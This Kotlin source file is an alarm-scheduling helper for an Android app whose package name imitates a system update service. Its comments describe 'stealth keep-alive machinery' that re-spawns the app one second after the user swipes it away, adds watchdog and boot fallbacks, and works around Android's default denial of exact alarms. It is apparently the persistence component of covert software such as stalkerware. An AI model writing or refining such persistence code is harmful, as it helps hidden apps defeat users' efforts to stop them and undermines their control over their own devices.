package com.androidsystem.update.service

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

/**
 * Central alarm helper for the stealth keep-alive machinery.
 *
 * The whole restart strategy (1-second re-spawn after swipe-away, the
 * watchdog fallback, the boot safety net) depends on exact alarms. On
 * Android 12+ an exact alarm requires the SCHEDULE_EXACT_ALARM special
 * access, and on Android 14+ that access is DENIED by default for apps
 * targeting API 33+. Without it, setExactAndAllowWhileIdle throws a
 * SecurityException and the app silently stays dead — exactly the "killed
 * and never comes back" symptom. This helper always prefers the exact
 * alarm but degrades to an inexact one (which needs no special access)
 * instead of failing.
 */
object AlarmScheduler {

    private const val TAG = "AlarmScheduler"

    fun canScheduleExact(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) return true
        val am = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        return try {
            am.canScheduleExactAlarms()
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Schedules a service start [delayMs] from now. Uses an exact
     * allow-while-idle alarm when possible (fast, reliable restart), and
     * falls back to a non-exact alarm when the special access is missing.
     */
    fun scheduleServiceStart(context: Context, cls: Class<*>, requestCode: Int, delayMs: Long) {
        val pi = PendingIntent.getService(
            context, requestCode, Intent(context, cls),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val am = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val triggerAt = System.currentTimeMillis() + delayMs
        try {
            if (canScheduleExact(context)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi)
                } else {
                    am.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pi)
                }
            } else {
                // Inexact but still fires — no special access required.
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi)
                } else {
                    am.set(AlarmManager.RTC_WAKEUP, triggerAt, pi)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "scheduleServiceStart failed for ${cls.simpleName}", e)
            try {
                am.set(AlarmManager.RTC_WAKEUP, triggerAt, pi)
            } catch (e2: Exception) {
                Log.e(TAG, "fallback alarm failed too", e2)
            }
        }
    }
}
